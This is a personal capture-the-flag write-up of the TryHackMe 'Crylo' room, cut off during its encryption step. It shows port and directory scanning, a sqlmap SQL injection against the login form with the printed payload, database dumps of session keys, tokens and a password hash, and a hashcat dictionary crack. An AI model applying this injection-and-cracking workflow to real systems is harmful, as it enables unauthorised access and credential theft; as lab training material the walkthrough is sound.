<p>July 15, 2025 - Day 435</p>
<h1>Crylo</h1>
<p><em>Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.</em>.<br>
https://tryhackme.com/room/crylo4a<br>
<p>Crylo is part of my 435ᵗʰ day on TryHackMe. It is classified as a medium-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click the link below, and let's get started!
Crylo</p>

<br>

<br>

<h2>Task 1 . Enumeration</h2>
<p>You have the IP address of your target. The goal is to find open ports and services to enumerate.</p>
<p><em>Answer the question below</em></p>
<p>1.1. <em>How many ports are open?</em>> Hint : Try using port scanner.<br>
<code>2</code></p>


<br>

<h3>/etc/hosts</h3>
<p>
  
- Added the Target_IP and the domain name crylo.thm to /etc/hosts.</p>

```bash
:~/Crylo# echo 'Target_IP crylo.thm' >> /etc/hosts
```

<h3>nmap</h3>

<p>

  - Used nmap. Identified 2 ports open: 22/ssh , and 80/http.</p>


```bash
:~/Crylo# nmap -v -sC -sV -oN nmap_report.txt crylo.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Spicyo
```

<p>1.2. <em>What is the 403/forbidden web page?</em> Hint : Try directory enumeration.<br>
<code>debug</code></p>

<h3>gobuster</h3>

<p>
  
- Used gobuster to enumerate the directories, and identify the 403 one.</p>

```bash
:~/Crylo# gobuster dir -u http://crylo.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crylo.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 8858]
/about                (Status: 200) [Size: 10720]
/login                (Status: 200) [Size: 13151]
/blog                 (Status: 200) [Size: 11402]
/debug                (Status: 403) [Size: 122]
/recipe               (Status: 200) [Size: 13914]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

<h3>http://crylo.thm/debug</h3>
  
<p>
  
-  Navigated to http://crylo.thm/debug. Indeed it is forbidden.</p>

<img width="1768" height="711" alt="image" src="https://github.com/user-attachments/assets/c2955624-e0cf-41c0-9712-2d5ad69aaac1" />


<br>

<h2>Task 2 . Injection</h2>
<p>The goal is to find a way to bypass the login. Find the username and password.</p>
<p><em>Answer the questions below</em></p>

<p>2.1. <em>What is the name of the first username?</em><br>
<code>admin</code>
  
<h3>http://crylo.thm</h3>

<img width="1769" height="669" alt="image" src="https://github.com/user-attachments/assets/21268d76-9e37-4a33-bfdf-eeb103b4fcd5" />


<h3>http://crylo.thm/login</h3>

<p>- Launched Burp Suite<br>
- Clicked Login<br>
- Enabled FoxyProxy in the right upper corner of the web browser<br>
- Tried to log in with the credentials admin:admin<br>
- Right-clicked over the Burp Suite´s Request  -  using the outcome from the login, clicked Save item, defined the name <code>request</code>, and clicked Save.</p>

<img width="1118" height="592" alt="image" src="https://github.com/user-attachments/assets/4e6a65ef-479c-4194-8ff0-3a8650a1be51" />

<img width="1174" height="371" alt="image" src="https://github.com/user-attachments/assets/d7571bab-aef3-407c-b002-9d6df7e61451" />

<p>- validation.js</p>

<img width="420" height="36" alt="image" src="https://github.com/user-attachments/assets/a91b3932-a05e-4084-bd3d-090184a906d0" />

<img width="455" height="40" alt="image" src="https://github.com/user-attachments/assets/e837c6b0-0ae6-44d4-ba4f-a9e867a57ee9" />

<img width="1125" height="477" alt="image" src="https://github.com/user-attachments/assets/8f2081b7-0874-4a8a-8ab1-5bcf98d5cbb7" />

<img width="440" height="22" alt="image" src="https://github.com/user-attachments/assets/50a0616e-8fbb-4990-b10a-49d25a34b56f" />

<img width="438" height="45" alt="image" src="https://github.com/user-attachments/assets/9cf3e621-cc68-46e7-bf43-e6b40ef1e0fc" />


<h3></h3>

<h3>sqlmap</h3>
<p>Used sqlmap command to test SQLI (SQL Injection). <code>sqlmap</code> is an open-source penetration testing tool used to help automate the detection and exploitation of SQL injection vulnerabilities in web applications, as well as set up database security parameters.</p>

<p>

- -r : path to a request file<br>
- -dbs : enumerate DBMS databases<br>
- --batch : never ask for user inout, use the default behavior.<br>
- --level : customize the detection phase. It is about the level of tests to perform (1 to 5, default 1)<br>
- <code>--risk</code> : specifies the risk of tests to perfom. There are 3 risk values. The default is 1 . Risk value 3 adds OR-based SQL injections tests.
  
</p>

```bash
:~/Crylo# sqlmap -r request --risk=3 --level=3 --dump --batch

...
(custom) POST parameter 'MULTIPART username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 606 HTTP(s) requests:
---
Parameter: MULTIPART username ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: -----------------------------25010206701543137832357116880
Content-Disposition: form-data; name="csrfmiddlewaretoken"

UoYgDDn9zRRshc3JjkAOIITEOIIFRHt2Xq9xrTzDOddcmCPJQioB4BCnU0bWCYV8
-----------------------------25010206701543137832357116880
Content-Disposition: form-data; name="username"

admin' or 1=-1636 OR 6550=(SELECT (CASE WHEN (6550=6550) THEN 6550 ELSE (SELECT 7151 UNION SELECT 3079) END))-- uiGX
-----------------------------25010206701543137832357116880
Content-Disposition: form-data; name="password"

admin
-----------------------------25010206701543137832357116880--
---
...
Database: food
Table: accounts_pintoken
[2 entries]
+---------+------+----------------------------------+
| user_id | id   | pintoken                         |
+---------+------+----------------------------------+
| anof    | 5    | 1ivdK0SmCTW3b0ZPHDkKMRSWrK6FhQbG |
| admin   | 137  | cCRFybLpQiCsgoM5GjLpPMoGCMFiGLtG |
+---------+------+----------------------------------+
...
Database: food
Table: auth_user_user_permissions
[0 entries]
+---------+---------------+------+
| user_id | permission_id | id   |
+---------+---------------+------+
+---------+---------------+------+
...
Database: food
Table: django_session
[6 entries]
+----------------------------+----------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| expire_date                | session_key                      | session_data                                                                                                                                                                                                                        |
+----------------------------+----------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 2021-10-16 14:25:55.937601 | jozmv8z1yy0lw0wfspiflxa6yd9m632l | .eJxVjDsOwjAQBe_iGln-BS-U9JzBWnt3cQA5UpxUiLtDpBTQvpl5L5VwXWpaO89pJHVWTh1-t4zlwW0DdMd2m3SZ2jKPWW-K3mnX14n4edndv4OKvX5rKA7AR0RLhgQgeCBjPVtGAMmSjZeIA8ToAguYQDaa4STogo-Fj-r9Ad_xN7E:1mWfxb:pxt69Z1N_UAAWUO6wtH_LW7-4TRAjt9qaPO3MFYGOGw |
| 2021-10-17 10:39:42.664410 | yfeyhxt4bm17g2i9j4hy54py3clzh7yj | .eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mWyuE:PUd-sMqktTogLEuri6wFhU0xr65WvMQpKng-wvGBMPQ |
| 2021-10-17 13:33:20.558410 | 0h40eymby4c2711xgdnzytlbb4l1tvh0 | .eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mX1cG:1rsDJloMG92YvqwV5mTSb_7pqLWLJQXm1JbQRGWHwhY |
| 2022-08-05 19:28:16.197670 | 29g32d0fw11zd7gpozvj65pi33bdchvy | .eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1oEyJs:7azT3oGlQZCV5RiwPVowtmb8xUiqOn9ggCGL-PFNCB4 |
| 2022-08-06 10:16:08.767206 | iogwt5i8x6bnie3osv7e5gxgkkgxfe14 | .eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1oFCB6:EbA8qc6f89AR3IPa5wpNWiRdzk00HzeLb0Z8ShTN6rk |
| 2022-08-21 13:46:06.669481 | 0khopbceahg2j80nwiebdhp4lrdyj4ss | .eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1oKgbW:pzsEeqdYInIhqWrtpDx_oQN25TsZYsEiXuFNrF47l-E |
+----------------------------+----------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
...
Database: food
Table: auth_permission
[36 entries]
+-----------------+------+-------------------------+--------------------+
| content_type_id | id   | name                    | codename           |
+-----------------+------+-------------------------+--------------------+
| 1               | 1    | Can add log entry       | add_logentry       |
| 1               | 2    | Can change log entry    | change_logentry    |
| 1               | 3    | Can delete log entry    | delete_logentry    |
| 1               | 4    | Can view log entry      | view_logentry      |
| 2               | 5    | Can add permission      | add_permission     |
| 2               | 6    | Can change permission   | change_permission  |
| 2               | 7    | Can delete permission   | delete_permission  |
| 2               | 8    | Can view permission     | view_permission    |
| 3               | 9    | Can add group           | add_group          |
| 3               | 10   | Can change group        | change_group       |
| 3               | 11   | Can delete group        | delete_group       |
| 3               | 12   | Can view group          | view_group         |
| 4               | 13   | Can add user            | add_user           |
| 4               | 14   | Can change user         | change_user        |
| 4               | 15   | Can delete user         | delete_user        |
| 4               | 16   | Can view user           | view_user          |
| 5               | 17   | Can add content type    | add_contenttype    |
| 5               | 18   | Can change content type | change_contenttype |
| 5               | 19   | Can delete content type | delete_contenttype |
| 5               | 20   | Can view content type   | view_contenttype   |
| 6               | 21   | Can add session         | add_session        |
| 6               | 22   | Can change session      | change_session     |
| 6               | 23   | Can delete session      | delete_session     |
| 6               | 24   | Can view session        | view_session       |
| 7               | 25   | Can add pin             | add_pin            |
| 7               | 26   | Can change pin          | change_pin         |
| 7               | 27   | Can delete pin          | delete_pin         |
| 7               | 28   | Can view pin            | view_pin           |
| 8               | 29   | Can add pin token       | add_pintoken       |
| 8               | 30   | Can change pin token    | change_pintoken    |
| 8               | 31   | Can delete pin token    | delete_pintoken    |
| 8               | 32   | Can view pin token      | view_pintoken      |
| 9               | 33   | Can add upload          | add_upload         |
| 9               | 34   | Can change upload       | change_upload      |
| 9               | 35   | Can delete upload       | delete_upload      |
| 9               | 36   | Can view upload         | view_upload        |
+-----------------+------+-------------------------+--------------------+

...
Database: food
Table: accounts_pin
[2 entries]
+---------+-------------------------------------------------+------+---------+
| user_id | pin                                             | id   | pin_set |
+---------+-------------------------------------------------+------+---------+
| anof    | b'6pe5VvUNvlRnl9+FRScl6f6CjCUDdzkUf38ogh8hyis=' | 2    | 1       |
| admin   | b'ag5NyzfxIXUtv6tmVZJB8ldPd/yql1qUTxf3dLPruIQ=' | 10   | 1       |
+---------+-------------------------------------------------+------+---------+


```

FtuO1/k2BbSVICzPhGNTSl/lRA3BJHiRue0GNvkWUmNFp6ouLOTQ4Ntkd8Srs9to

<p>To practice ...<br>
Used sqlmap to discover the tables in <code>food</code> database.</p>

```bash
:~/Crylo#  sqlmap -r request.txt -D food --tables --batch
...
Database: food
[13 tables]
+----------------------------+
| accounts_pin               |
| accounts_pintoken          |
| accounts_upload            |
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
...
```

<p>Used sqlmap to discover the columns in <code>auth_user</code> table in <code>food</code> database.</p>

```bash
:~/Crylo# sqlmap -r request -T auth_user --columns --batch
...
database: food
Table: auth_user
[11 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int          |
| password     | varchar(128) |
| date_joined  | datetime(6)  |
| email        | varchar(254) |
| first_name   | varchar(150) |
| is_active    | tinyint(1)   |
| is_staff     | tinyint(1)   |
| is_superuser | tinyint(1)   |
| last_login   | datetime(6)  |
| last_name    | varchar(150) |
| username     | varchar(150) |
+--------------+--------------+
```

<p>Used sqlmap to discover the usernames in <code>auth_user</code> table in <code>food</code> database.</p>

```bash
:~/Crylo# sqlmap -r request -D food -T auth_user -C username --dump --batch
...
Database: food
Table: auth_user
[2 entries]
+----------+
| username |
+----------+
| admin    |
| anof     |
+----------+
```


<p>2.2. <em></em>What is the password for the above user?</em> Hint : Brute-forcing is out of scope.<br>
<code>trigger</code></p>

<p>Used sqlmap to discover the passwords in <code>auth_user</code> table in <code>food</code> database.</p>

```bash
:~/Crylo# sqlmap -r request -D food -T auth_user -C password --dump --batch
...
Database: food
Table: auth_user
[2 entries]
+------------------------------------------------------------------------------------------+
| password                                                                                 |
+------------------------------------------------------------------------------------------+
| pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE= |
| VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0=                                             |
+------------------------------------------------------------------------------------------+
```

<h3>hashcat</h3>

```bash
:~/Crylo# hashcat --help | grep PBKDF2-SHA256
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating System
  10000 | Django (PBKDF2-SHA256)                           | Framework
```

```bash
~/Crylo# cat hash
pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
```

```bash
:~/Crylo# hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=:trigger
```

<img width="1115" height="378" alt="image" src="https://github.com/user-attachments/assets/94eee9e0-86ff-4bf0-9852-1ace226cb6fe" />

<img width="929" height="361" alt="image" src="https://github.com/user-attachments/assets/66d73d00-322d-4b6a-8dc7-9ad87989baca" />

<br>

<h2>Encryption</h2>

<p>

- navigated to crylo.thm/set-pin<br>
- typed and entered <code>8080808080808080</code><br>

<img width="1114" height="389" alt="image" src="https://github.com/user-attachments/assets/de4115c1-26f9-4cc9-a893-44bed11436be" />

- token is invalid<br>
- navigated to <code>crylo.thm/static/js/validation.js<br>

<img width="1115" height="356" alt="image" src="https://github.com/user-attachments/assets/9e301024-f19f-4b52-a176-05017dd1db89" />


  
- right-clicked Burp request panel<br>
- clicked <code>Do intercept</code><br>
- clicked <code>Response to this request</code><br>
- clicked <code>Forward</code></p>


.....


